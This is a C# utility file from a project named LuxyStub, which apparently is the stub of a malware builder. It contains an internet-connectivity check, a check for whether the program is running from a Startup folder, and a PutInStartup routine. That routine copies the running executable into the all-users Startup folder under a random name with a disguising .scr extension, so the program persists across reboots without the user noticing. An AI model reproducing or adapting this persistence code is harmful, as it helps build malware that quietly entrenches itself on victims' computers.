using System;
using System.IO;
using System.Net;
using System.Reflection;
using System.Text;
using System.Threading.Tasks;
using System.Net.Http;

namespace LuxyStub.Components.Utilities
{
    internal static class Common
    {
        internal static async Task<bool> IsConnectionAvailable()
        {
            try
            {
                using (HttpClient httpClient = new HttpClient { Timeout = TimeSpan.FromSeconds(5.0) })
                {
                    HttpResponseMessage response = await httpClient.GetAsync("https://gstatic.com/generate_204");
                    return response.StatusCode ==
                           HttpStatusCode.NoContent;
                }
            }
            catch
            {
                return false;
            }
        }

        internal static bool IsInStartup()
        {
            try
            {
                string currentPath = Assembly.GetExecutingAssembly().Location;
                string currentDirectoryPath = Path.GetDirectoryName(currentPath);
                string[] startupPaths =
                {
                    Environment.GetFolderPath(Environment.SpecialFolder.CommonStartup),
                    Environment.GetFolderPath(Environment.SpecialFolder.Startup)
                };
                return Array.Exists(startupPaths, e => e.Equals(currentDirectoryPath, StringComparison.OrdinalIgnoreCase));
            }
            catch
            {
                return false;
            }
        }

        internal static string GenerateRandomString(int length)
        {
            Random random = new Random();
            string chars = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
            StringBuilder result = new StringBuilder();

            for (int i = 0; i < length; i++)
                result.Append(chars[random.Next(0, chars.Length)]);

            return result.ToString();
        }

        internal static void PutInStartup()
        {
            string currentPath = Assembly.GetExecutingAssembly().Location;
            string startupDir = Environment.GetFolderPath(Environment.SpecialFolder.CommonStartup);
            string newFilePath = Path.Combine(startupDir, $"{GenerateRandomString(5)}.scr");

            try
            {
                File.Copy(currentPath, newFilePath, true);
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
            }
        }
    }
}
